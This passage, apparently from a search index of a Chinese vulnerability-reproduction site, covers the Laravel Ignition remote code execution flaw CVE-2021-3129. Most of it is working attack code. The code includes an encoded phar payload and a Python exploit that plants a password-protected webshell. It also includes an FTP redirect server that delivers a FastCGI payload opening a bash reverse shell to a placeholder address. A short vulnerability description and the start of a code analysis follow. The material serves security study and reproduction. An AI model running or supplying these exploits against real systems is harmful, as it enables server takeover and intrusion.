00=56=00=6D=00=59=00=7A=00=4E=00=53=00=61=00=47=00=4E=00=75=00=55=00=57=00=39=00=4C=00=56=00=48=00=52=00=42=00=59=00=7A=00=4A=00=57=00=4D=00=46=00=67=00=7A=00=55=00=6E=00=42=00=69=00=56=00=31=00=5A=00=6D=00=59=00=6B=00=64=00=73=00=64=00=47=00=46=00=59=00=55=00=57=00=39=00=4E=00=51=00=32=00=73=00=33=00=55=00=55=00=64=00=57=00=65=00=57=00=4E=00=74=00=4F=00=58=00=6C=00=59=00=4D=00=30=00=70=00=73=00=59=00=30=00=63=00=35=00=65=00=57=00=52=00=48=00=62=00=48=00=56=00=61=00=65=00=57=00=64=00=33=00=53=00=31=00=52=00=30=00=62=00=57=00=52=00=58=00=4E=00=57=00=70=00=6B=00=52=00=32=00=78=00=32=00=59=00=6D=00=6C=00=43=00=52=00=6B=00=74=00=44=00=55=00=6B=00=56=00=4D=00=51=00=31=00=4A=00=4D=00=53=00=31=00=68=00=30=00=62=00=57=00=49=00=7A=00=53=00=57=00=39=00=4B=00=52=00=32=00=73=00=35=00=53=00=55=00=52=00=42=00=5A=00=30=00=39=00=35=00=55=00=6E=00=42=00=51=00=53=00=45=00=34=00=77=00=59=00=32=00=31=00=34=00=62=00=47=00=4A=00=70=00=5A=00=32=00=74=00=53=00=51=00=32=00=73=00=33=00=53=00=6B=00=64=00=72=00=63=00=6B=00=74=00=35=00=62=00=44=00=64=00=4B=00=52=00=56=00=4A=00=69=00=53=00=6B=00=64=00=73=00=5A=00=46=00=42=00=54=00=55=00=6B=00=56=00=58=00=65=00=56=00=4A=00=77=00=57=00=46=00=59=00=30=00=61=00=31=00=4D=00=78=00=63=00=32=00=74=00=68=00=55=00=33=00=4E=00=6E=00=54=00=56=00=4E=00=42=00=62=00=55=00=6C=00=45=00=52=00=54=00=46=00=4A=00=52=00=6A=00=41=00=33=00=5A=00=6C=00=68=00=4B=00=62=00=47=00=52=00=49=00=56=00=6E=00=6C=00=69=00=61=00=56=00=4A=00=46=00=54=00=7A=00=4D=00=78=00=62=00=57=00=52=00=58=00=4E=00=57=00=70=00=6B=00=52=00=32=00=78=00=32=00=59=00=6D=00=6C=00=43=00=55=00=6B=00=74=00=44=00=55=00=6B=00=56=00=4C=00=57=00=48=00=52=00=35=00=57=00=6C=00=68=00=53=00=4D=00=57=00=4E=00=74=00=4E=00=47=00=64=00=5A=00=62=00=55=00=5A=00=36=00=57=00=6C=00=52=00=5A=00=4D=00=46=00=67=00=79=00=56=00=6E=00=56=00=5A=00=4D=00=6A=00=6C=00=72=00=57=00=6C=00=4E=00=6E=00=61=00=31=00=4A=00=44=00=61=00=7A=00=64=00=6D=00=56=00=31=00=6F=00=78=00=59=00=6D=00=31=00=4F=00=4D=00=47=00=46=00=58=00=4F=00=58=00=56=00=4A=00=52=00=54=00=68=00=76=00=53=00=6B=00=56=00=52=00=63=00=47=00=55=00=7A=00=53=00=6D=00=78=00=6B=00=53=00=46=00=5A=00=35=00=59=00=6D=00=6C=00=43=00=61=00=56=00=6C=00=59=00=54=00=6D=00=78=00=4F=00=61=00=6C=00=4A=00=6D=00=57=00=6B=00=64=00=57=00=61=00=6D=00=49=00=79=00=55=00=6D=00=78=00=4C=00=51=00=31=00=4A=00=46=00=53=00=31=00=52=00=30=00=4F=00=55=00=70=00=47=00=51=00=54=00=6C=00=4B=00=4D=00=30=00=4A=00=6F=00=59=00=7A=00=4E=00=4E=00=62=00=6B=00=39=00=35=00=55=00=6C=00=64=00=51=00=55=00=32=00=52=00=33=00=57=00=56=00=68=00=73=00=63=00=32=00=49=00=79=00=52=00=6D=00=74=00=4B=00=65=00=6E=00=4E=00=72=00=56=00=6B=00=51=00=77=00=62=00=6B=00=30=00=79=00=54=00=54=00=4A=00=61=00=56=00=45=00=4A=00=70=00=54=00=30=00=64=00=46=00=4E=00=56=00=6C=00=36=00=52=00=54=00=46=00=4E=00=61=00=6B=00=6B=00=77=00=57=00=56=00=4E=00=6A=00=4E=00=32=00=46=00=58=00=57=00=57=00=39=00=68=00=57=00=45=00=35=00=36=00=57=00=6C=00=68=00=52=00=62=00=30=00=70=00=47=00=4F=00=56=00=46=00=55=00=4D=00=55=00=35=00=56=00=56=00=33=00=6C=00=53=00=55=00=56=00=68=00=54=00=61=00=33=00=42=00=6C=00=65=00=56=00=4A=00=48=00=55=00=46=00=55=00=34=00=62=00=31=00=4A=00=54=00=61=00=46=00=42=00=4C=00=51=00=31=00=4A=00=6D=00=56=00=55=00=55=00=35=00=56=00=46=00=5A=00=47=00=63=00=32=00=74=00=56=00=52=00=6A=00=42=00=77=00=54=00=45=00=4E=00=53=00=56=00=55=00=74=00=54=00=61=00=7A=00=64=00=68=00=56=00=31=00=6C=00=76=00=59=00=56=00=68=00=4F=00=65=00=6C=00=70=00=59=00=55=00=57=00=39=00=4B=00=52=00=6A=00=6C=00=55=00=55=00=6C=00=5A=00=4F=00=56=00=46=00=4E=00=56=00=4F=00=55=00=39=00=58=00=65=00=56=00=4A=00=58=00=57=00=46=00=4E=00=72=00=63=00=47=00=56=00=35=00=55=00=6B=00=31=00=51=00=55=00=31=00=4A=00=6D=00=56=00=54=00=42=00=57=00=56=00=46=00=55=00=77=00=62=00=46=00=42=00=55=00=62=00=48=00=4E=00=72=00=56=00=6D=00=77=00=77=00=4E=00=30=00=70=00=46=00=52=00=54=00=6C=00=61=00=57=00=47=00=68=00=33=00=59=00=6B=00=63=00=35=00=61=00=31=00=70=00=54=00=5A=00=32=00=35=00=6D=00=51=00=32=00=4E=00=7A=00=53=00=6B=00=56=00=33=00=63=00=45=00=38=00=79=00=54=00=6E=00=4E=00=5A=00=57=00=45=00=35=00=36=00=53=00=55=00=56=00=4F=00=4E=00=32=00=4E=00=49=00=56=00=6D=00=6C=00=69=00=52=00=32=00=78=00=71=00=53=00=55=00=64=00=61=00=4D=00=57=00=4A=00=74=00=54=00=6A=00=42=00=68=00=56=00=7A=00=6C=00=31=00=53=00=55=00=63=00=31=00=4D=00=6D=00=49=00=79=00=64=00=47=00=78=00=4C=00=51=00=31=00=4A=00=33=00=53=00=31=00=68=00=30=00=62=00=47=00=52=00=74=00=52=00=6E=00=4E=00=4C=00=51=00=31=00=4A=00=33=00=54=00=47=00=6C=00=4A=00=61=00=55=00=74=00=55=00=64=00=44=00=6C=00=6D=00=55=00=31=00=4A=00=54=00=55=00=46=00=63=00=31=00=62=00=47=00=52=00=35=00=51=00=6B=00=52=00=4C=00=51=00=32=00=73=00=33=00=53=00=6B=00=5A=00=4A=00=64=00=46=00=42=00=74=00=4E=00=54=00=4A=00=69=00=4D=00=6E=00=52=00=73=00=53=00=30=00=4E=00=53=00=51=00=6C=00=64=00=35=00=51=00=58=00=64=00=4A=00=52=00=6A=00=42=00=77=00=54=00=7A=00=4A=00=57=00=61=00=6D=00=46=00=48=00=4F=00=47=00=64=00=6A=00=4D=00=31=00=5A=00=70=00=59=00=7A=00=4E=00=53=00=65=00=55=00=74=00=48=00=4D=00=57=00=74=00=4F=00=55=00=32=00=64=00=72=00=56=00=55=00=4D=00=30=00=61=00=31=00=5A=00=44=00=61=00=33=00=4E=00=4A=00=52=00=45=00=46=00=6E=00=54=00=45=00=4E=00=42=00=65=00=45=00=35=00=70=00=51=00=58=00=42=00=50=00=4D=00=6C=00=5A=00=71=00=59=00=55=00=63=00=34=00=5A=00=31=00=56=00=54=00=61=00=45=00=5A=00=4C=00=52=00=55=00=4A=00=35=00=5A=00=46=00=63=00=30=00=62=00=30=00=70=00=46=00=57=00=58=00=42=00=4D=00=51=00=31=00=4A=00=56=00=53=00=31=00=4E=00=72=00=4E=00=31=00=70=00=58=00=54=00=6D=00=39=00=69=00=65=00=55=00=4A=00=36=00=5A=00=46=00=64=00=4B=00=65=00=6D=00=52=00=49=00=53=00=57=00=39=00=69=00=56=00=31=00=45=00=78=00=53=00=30=00=4E=00=53=00=55=00=55=00=78=00=70=00=55=00=6C=00=56=00=4C=00=55=00=33=00=64=00=6E=00=54=00=56=00=52=00=5A=00=5A=00=30=00=74=00=55=00=64=00=44=00=6C=00=61=00=56=00=33=00=68=00=36=00=57=00=6C=00=68=00=7A=00=61=00=31=00=67=00=78=00=54=00=6B=00=5A=00=56=00=4D=00=55=00=35=00=4B=00=56=00=44=00=41=00=31=00=59=00=6B=00=70=00=47=00=57=00=6D=00=52=00=51=00=55=00=31=00=4A=00=48=00=54=00=7A=00=4D=00=78=00=4F=00=53=00=42=00=38=00=49=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=43=00=41=00=74=00=5A=00=43=00=41=00=2B=00=4C=00=69=00=39=00=6D=00=64=00=57=00=4E=00=72=00=65=00=57=00=39=00=31=00=4C=00=6E=00=42=00=6F=00=63=00=43=00=49=00=37=00=63=00=7A=00=6F=00=31=00=4F=00=69=00=4A=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=62=00=47=00=56=00=32=00=5A=00=57=00=77=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=68=00=62=00=47=00=6C=00=36=00=5A=00=57=00=51=00=69=00=4F=00=32=00=49=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=4D=00=61=00=57=00=31=00=70=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=77=00=63=00=6D=00=39=00=6A=00=5A=00=58=00=4E=00=7A=00=62=00=33=00=4A=00=7A=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=6D=00=4E=00=31=00=63=00=6E=00=4A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=32=00=6B=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=59=00=36=00=49=00=6E=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=49=00=37=00=66=00=58=00=31=00=39=00=42=00=51=00=41=00=41=00=41=00=47=00=52=00=31=00=62=00=57=00=31=00=35=00=42=00=41=00=41=00=41=00=41=00=44=00=77=00=7A=00=43=00=6D=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=44=00=77=00=7A=00=43=00=6D=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=48=00=52=00=6C=00=63=00=33=00=53=00=6D=00=31=00=59=00=37=00=6B=00=34=00=32=00=72=00=2B=00=63=00=49=00=36=00=74=00=78=00=58=00=67=00=47=00=6A=00=36=00=46=00=66=00=4A=00=33=00=72=00=43=00=58=00=51=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00a\" } } req = requests . post ( url , headers = header , data = json . dumps ( data , indent = 1 )) return req def filterlog ( url ): data = { \"solution\" : \"Facade \\\\ Ignition \\\\ Solutions \\\\ MakeViewVariableOptionalSolution\" , \"parameters\" : { \"variableName\" : \"username\" , \"viewFile\" : \"php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log\" } } req = requests . post ( url , headers = header , data = json . dumps ( data , indent = 1 )) return req def phar ( url , path ): data = { \"solution\" : \"Facade \\\\ Ignition \\\\ Solutions \\\\ MakeViewVariableOptionalSolution\" , \"parameters\" : { \"variableName\" : \"username\" , \"viewFile\" : \"phar://\" + path + \"\\storage \\\\ logs \\\\ laravel.log \\\\ test.txt\" } } req = requests . post ( url , headers = header , data = json . dumps ( data , indent = 1 )) return req def pharl ( url , path ): data = { \"solution\" : \"Facade \\\\ Ignition \\\\ Solutions \\\\ MakeViewVariableOptionalSolution\" , \"parameters\" : { \"variableName\" : \"username\" , \"viewFile\" : \"phar://\" + path + \"/storage/logs/laravel.log/test.txt\" } } req = requests . post ( url , headers = header , data = json . dumps ( data , indent = 1 )) return req def path ( url ): req = requests . get ( url ) . text pattern = re . compile ( r '(\\#\\d*\\ (.*)(?:\\/| \\\\ )vendor)' ) m = pattern . findall ( req ) return m [ 0 ][ 1 ] if __name__ == '__main__' : print ( ''' \u2588\u2588\u2588\u2588\u2588\u2588 \u2593\u2588\u2588\u2588\u2588\u2588 \u2584\u2588\u2588\u2588\u2588\u2584 \u2588\u2588\u2593\u2588\u2588\u2588 \u2588\u2588\u2580\u2588\u2588\u2588 \u2592\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588 \u2592\u2588\u2588 \u2592 \u2593\u2588 \u2580 \u2592\u2588\u2588\u2580 \u2580\u2588 \u2593\u2588\u2588\u2591 \u2588\u2588\u2592\u2593\u2588\u2588 \u2592 \u2588\u2588\u2592\u2592\u2588\u2588\u2592 \u2588\u2588\u2592\u2592\u2588\u2588 \u2592 \u2591 \u2593\u2588\u2588\u2584 \u2592\u2588\u2588\u2588 \u2592\u2593\u2588 \u2584 \u2593\u2588\u2588\u2591 \u2588\u2588\u2593\u2592\u2593\u2588\u2588 \u2591\u2584\u2588 \u2592\u2592\u2588\u2588\u2591 \u2588\u2588\u2592\u2591 \u2593\u2588\u2588\u2584 \u2592 \u2588\u2588\u2592\u2592\u2593\u2588 \u2584 \u2592\u2593\u2593\u2584 \u2584\u2588\u2588\u2592\u2592\u2588\u2588\u2584\u2588\u2593\u2592 \u2592\u2592\u2588\u2588\u2580\u2580\u2588\u2584 \u2592\u2588\u2588 \u2588\u2588\u2591 \u2592 \u2588\u2588\u2592 \u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2591\u2592\u2588\u2588\u2588\u2588\u2592\u2592 \u2593\u2588\u2588\u2588\u2580 \u2591\u2592\u2588\u2588\u2592 \u2591 \u2591\u2591\u2588\u2588\u2593 \u2592\u2588\u2588\u2592\u2591 \u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592 \u2592 \u2592\u2593\u2592 \u2592 \u2591\u2591\u2591 \u2592\u2591 \u2591\u2591 \u2591\u2592 \u2592 \u2591\u2592\u2593\u2592\u2591 \u2591 \u2591\u2591 \u2592\u2593 \u2591\u2592\u2593\u2591\u2591 \u2592\u2591\u2592\u2591\u2592\u2591 \u2592 \u2592\u2593\u2592 \u2592 \u2591 \u2591 \u2591\u2592 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2592 \u2591\u2592 \u2591 \u2591\u2592 \u2591 \u2592\u2591 \u2591 \u2592 \u2592\u2591 \u2591 \u2591\u2592 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591\u2591 \u2591\u2591 \u2591 \u2591 \u2591 \u2591 \u2592 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591\u2591 \u2591 \u2591 \u2591 \u2591 \u2591 \u2591 ''' ) url = sys . argv [ 1 ] + \"/_ignition/execute-solution\" clearlog ( url ) clearlog ( url ) clearlog ( url ) clearlog ( url ) clearlog ( url ) if ( AA ( url ) . status_code == 500 ): if ( \":\" in path ( url )): print ( \"windows\" ) if ( sendpayloadwindows ( url ) . status_code == 500 ): if ( filterlog ( url ) . status_code == 200 ): if ( phar ( url , path ( url )) . status_code == 500 ): if ( requests . get ( sys . argv [ 1 ] + \"/fuckyou.php\" ) . status_code == 200 ): print ( \"[+]webshell\u5730\u5740:\" + sys . argv [ 1 ] + \"/fuckyou.php,\u5bc6\u7801:pass\" ) else : print ( \"[-]\u6f0f\u6d1e\u4e0d\u5b58\u5728\" ) if ( \":\" not in path ( url )): print ( \"linux\" ) if ( sendpayloadlinux ( url ) . status_code == 500 ): if ( filterlog ( url ) . status_code == 200 ): if ( pharl ( url , path ( url )) . status_code == 500 ): if ( requests . get ( sys . argv [ 1 ] + \"/fuckyou.php\" ) . status_code == 200 ): print ( \"webshell\u5730\u5740:\" + sys . argv [ 1 ] + \"/fuckyou.php,\u5bc6\u7801:pass\" ) else : print ( \"[-]\u6f0f\u6d1e\u4e0d\u5b58\u5728\" ) \u6839\u636e\u8def\u5f84\u5bc6\u7801\u4f7f\u7528\u54e5\u65af\u62c9\u8fde\u63a5\u6728\u9a6c FTP\u811a\u672c # -*- coding: utf-8 -*- # @Time : 2021/1/13 6:56 \u4e0b\u5348 # @Author : tntaxin # @File : ftp_redirect.py # @Software: import socket from urllib.parse import unquote # \u5bf9gopherus\u751f\u6210\u7684payload\u8fdb\u884c\u4e00\u6b21urldecode payload = unquote ( \" %01% 01 %00% 01 %00% 08 %00% 00 %00% 01 %00% 00 %00% 00 %00% 00 %01% 04 %00% 01 %01% 07 %07% 00 %0F %10SERVER_SOFTWAREgo%20/ %20f cgiclient %20% 0B%09REMOTE_ADDR127.0.0.1 %0F %08SERVER_PROTOCOLHTTP/1.1 %0E %03CONTENT_LENGTH106 %0E %04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include %20% 3D%20On%0Adisable_functions %20% 3D %20% 0Aauto_prepend_file %20% 3D%20php%3A//input %0F %19SCRIPT_FILENAME/var/www/public/index.php%0D%01DOCUMENT_ROOT/ %00% 00 %00% 00 %00% 00 %00% 01 %04% 00 %01% 00 %00% 00 %00% 01 %05% 00 %01% 00j %04% 00%3C %3F php %20s ystem %28% 27bash%20-c %20% 22bash%20-i %20% 3E %26% 20/dev/tcp/xxx.xxx.xxx.xxx/9999 %200% 3E %261% 22 %27% 29%3Bdie %28% 27-----Made-by-SpyD3r-----%0A %27% 29%3B %3F%3E%00% 00 %00% 00\" ) payload = payload . encode ( 'utf-8' ) host = '0.0.0.0' port = 23 sk = socket . socket () sk . bind (( host , port )) sk . listen ( 5 ) # ftp\u88ab\u52a8\u6a21\u5f0f\u7684passvie port,\u76d1\u542c\u52301234 sk2 = socket . socket () sk2 . bind (( host , 1234 )) sk2 . listen () # \u8ba1\u6570\u5668\uff0c\u7528\u4e8e\u533a\u5206\u662f\u7b2c\u51e0\u6b21ftp\u8fde\u63a5 count = 1 while 1 : conn , address = sk . accept () conn . send ( b \"200 \\n \" ) print ( conn . recv ( 20 )) # USER aaa\\r\\n \u5ba2\u6237\u7aef\u4f20\u6765\u7528\u6237\u540d if count == 1 : conn . send ( b \"220 ready \\n \" ) else : conn . send ( b \"200 ready \\n \" ) print ( conn . recv ( 20 )) # TYPE I\\r\\n \u5ba2\u6237\u7aef\u544a\u8bc9\u670d\u52a1\u7aef\u4ee5\u4ec0\u4e48\u683c\u5f0f\u4f20\u8f93\u6570\u636e\uff0cTYPE I\u8868\u793a\u4e8c\u8fdb\u5236\uff0c TYPE A\u8868\u793a\u6587\u672c if count == 1 : conn . send ( b \"215 \\n \" ) else : conn . send ( b \"200 \\n \" ) print ( conn . recv ( 20 )) # SIZE /123\\r\\n \u5ba2\u6237\u7aef\u8be2\u95ee\u6587\u4ef6/123\u7684\u5927\u5c0f if count == 1 : conn . send ( b \"213 3 \\n \" ) else : conn . send ( b \"300 \\n \" ) print ( conn . recv ( 20 )) # EPSV\\r\\n' conn . send ( b \"200 \\n \" ) print ( conn . recv ( 20 )) # PASV\\r\\n \u5ba2\u6237\u7aef\u544a\u8bc9\u670d\u52a1\u7aef\u8fdb\u5165\u88ab\u52a8\u8fde\u63a5\u6a21\u5f0f if count == 1 : conn . send ( b \"227 127,0,0,1,4,210 \\n \" ) # \u670d\u52a1\u7aef\u544a\u8bc9\u5ba2\u6237\u7aef\u9700\u8981\u5230\u54ea\u4e2aip:port\u53bb\u83b7\u53d6\u6570\u636e,ip,port\u90fd\u662f\u7528\u9017\u53f7\u9694\u5f00\uff0c\u5176\u4e2d\u7aef\u53e3\u7684\u8ba1\u7b97\u89c4\u5219\u4e3a\uff1a4*256+210=1234 else : conn . send ( b \"227 127,0,0,1,35,40 \\n \" ) # \u7aef\u53e3\u8ba1\u7b97\u89c4\u5219\uff1a35*256+40=9000 print ( conn . recv ( 20 )) # \u7b2c\u4e00\u6b21\u8fde\u63a5\u4f1a\u6536\u5230\u547d\u4ee4RETR /123\\r\\n\uff0c\u7b2c\u4e8c\u6b21\u8fde\u63a5\u4f1a\u6536\u5230STOR /123\\r\\n if count == 1 : conn . send ( b \"125 \\n \" ) # \u544a\u8bc9\u5ba2\u6237\u7aef\u53ef\u4ee5\u5f00\u59cb\u6570\u636e\u94fe\u63a5\u4e86 # \u65b0\u5efa\u4e00\u4e2asocket\u7ed9\u670d\u52a1\u7aef\u8fd4\u56de\u6211\u4eec\u7684payload print ( \"\u5efa\u7acb\u8fde\u63a5!\" ) conn2 , address2 = sk2 . accept () conn2 . send ( payload ) conn2 . close () print ( \"\u65ad\u5f00\u8fde\u63a5!\" ) else : conn . send ( b \"150 \\n \" ) print ( conn . recv ( 20 )) exit () # \u7b2c\u4e00\u6b21\u8fde\u63a5\u662f\u4e0b\u8f7d\u6587\u4ef6\uff0c\u9700\u8981\u544a\u8bc9\u5ba2\u6237\u7aef\u4e0b\u8f7d\u5df2\u7ecf\u7ed3\u675f if count == 1 : conn . send ( b \"226 \\n \" ) conn . close () count += 1 \u53c2\u8003\u6587\u7ae0 \u00b6 \u7c73\u65af\u7279\u56e2\u961f|\u6f0f\u6d1e\u5206\u6790 | Laravel Debug\u9875\u9762RCE\uff08CVE-2021-3129\uff09\u5206\u6790\u590d\u73b0 \u964c\u964c\u5b89\u5168|FTP\u5229\u7528|LARAVEL\u7684\u90a3\u4e2aRCE\u6700\u6709\u8da3\u7684\u70b9\u5728\u8fd9\u91cc \u539f\u4f5c\u8005\u6f0f\u6d1e\u5206\u6790","title":"Laravel \u5c0f\u4e8e 8.4.2 Debug\u6a21\u5f0f _ignition \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2021-3129"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Laravel/Laravel%20%E5%B0%8F%E4%BA%8E%208.4.2%20Debug%E6%A8%A1%E5%BC%8F%20_ignition%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-3129/#laravel--842-debug\u6a21\u5f0f-_ignition-\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e-cve-2021-3129","text":"","title":"Laravel &lt;= 8.4.2 Debug\u6a21\u5f0f _ignition \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CVE-2021-3129"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Laravel/Laravel%20%E5%B0%8F%E4%BA%8E%208.4.2%20Debug%E6%A8%A1%E5%BC%8F%20_ignition%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-3129/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Laravel \u662f\u4e00\u4e2a\u514d\u8d39\u7684\u5f00\u6e90 PHP Web \u6846\u67b6\uff0c\u65e8\u5728\u5b9e\u73b0\u7684Web\u8f6f\u4ef6\u7684MVC\u67b6\u6784\u30022021\u5e741\u670813\u65e5\uff0c\u963f\u91cc\u4e91\u5e94\u6025\u54cd\u5e94\u4e2d\u5fc3\u76d1\u63a7\u5230\u56fd\u5916\u67d0\u5b89\u5168\u7814\u7a76\u56e2\u961f\u62ab\u9732\u4e86 Laravel <= 8.4.2 \u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002\u5f53Laravel\u5f00\u542f\u4e86Debug\u6a21\u5f0f\u65f6\uff0c\u7531\u4e8eLaravel\u81ea\u5e26\u7684Ignition\u529f\u80fd\u7684\u67d0\u4e9b\u63a5\u53e3\u5b58\u5728\u8fc7\u6ee4\u4e0d\u4e25\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u53d1\u8d77\u6076\u610f\u8bf7\u6c42\uff0c\u901a\u8fc7\u6784\u9020\u6076\u610fLog\u6587\u4ef6\u7b49\u65b9\u5f0f\u89e6\u53d1Phar\u53cd\u5e8f\u5217\u5316\uff0c\u4ece\u800c\u9020\u6210\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff0c\u63a7\u5236\u670d\u52a1\u5668\u3002\u6f0f\u6d1e\u7ec6\u8282\u5df2\u5728\u4e92\u8054\u7f51\u516c\u5f00\u3002\u963f\u91cc\u4e91\u5e94\u6025\u54cd\u5e94\u4e2d\u5fc3\u63d0\u9192 Laravel \u7528\u6237\u5c3d\u5feb\u91c7\u53d6\u5b89\u5168\u63aa\u65bd\u963b\u6b62\u6f0f\u6d1e\u653b\u51fb\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Laravel/Laravel%20%E5%B0%8F%E4%BA%8E%208.4.2%20Debug%E6%A8%A1%E5%BC%8F%20_ignition%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-3129/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Laravel \u6846\u67b6 < 8.4.3 facade ignition \u7ec4\u4ef6 < 2.5.2","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Laravel/Laravel%20%E5%B0%8F%E4%BA%8E%208.4.2%20Debug%E6%A8%A1%E5%BC%8F%20_ignition%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-3129/#\u73af\u5883\u642d\u5efa","text":"https://github.com/SNCKER/CVE-2021-3129.git docker-compose up -d \u70b9\u51fb\u751f\u6210\u5bc6\u94a5\u51fa\u73b0\u5982\u4e0b\u56fe\u5373\u6210\u529f\u521b\u5efa\u6f0f\u6d1e\u73af\u5883","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Laravel/Laravel%20%E5%B0%8F%E4%BA%8E%208.4.2%20Debug%E6%A8%A1%E5%BC%8F%20_ignition%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-3129/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6309\u7167\u6f0f\u6d1e\u516c\u5f00\u6587\u7ae0\u9700\u8981\u5148\u6709\u4e00\u4e2a\u672a\u77e5\u53d8\u91cf\u7684\u9519\u8bef\uff0c\u6765\u70b9\u51fb Make variable optional [!NOTE] \u6309\u7167\u5b98\u65b9\u624b\u518c\u521b\u5efa\u8def\u7531\u548cView\u6a21\u677f \u901a\u8fc7\u70b9\u51fb\u201cMake variableOptional\u201d\u6309\u94ae\uff0c\u6a21\u677f\u53d8\u91cf\u5219\u4f1a\u88ab\u4fee\u6539\u3002\u5982\u679c\u68c0\u67e5HTTP\u65e5\u5fd7\uff0c\u6211\u4eec\u5c31\u4f1a\u770b\u5230\u88ab\u8c03\u7528\u7684\u7aef\u70b9 \u901a\u8fc7\u8fd9\u4e9bsolutions\uff0c\u5f00\u53d1\u8005\u53ef\u4ee5\u901a\u8fc7\u70b9\u51fb\u6309\u94ae\u7684\u65b9\u5f0f\uff0c\u5feb\u901f\u4fee\u590d\u4e00\u4e9b\u9519\u8bef\u3002\u672c\u6b21\u6f0f\u6d1e\u5c31\u662f\u5176\u4e2d\u7684 vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php \u8fc7\u6ee4\u4e0d\u4e25\u8c28\u5bfc\u81f4\u7684\u3002\u9996\u5148\u6211\u4eec\u5230\u6267\u884csolution\u7684\u63a7\u5236\u5668\u5f53\u4e2d\u53bb\uff0c\u770b\u770b\u662f\u5982\u4f55\u8c03\u7528\u5230solution\u7684 <?php namespace Facade\\Ignition\\Http\\Controllers ; use Facade\\Ignition\\Http\\Requests\\ExecuteSolutionRequest ; use Facade\\IgnitionContracts\\SolutionProviderRepository ; use Illuminate\\Foundation\\Validation\\ValidatesRequests ; class ExecuteSolutionController { use ValidatesRequests ; public function __invoke ( ExecuteSolutionRequest $request , SolutionProviderRepository $solutionProviderRepository ) { $solution = $request -> 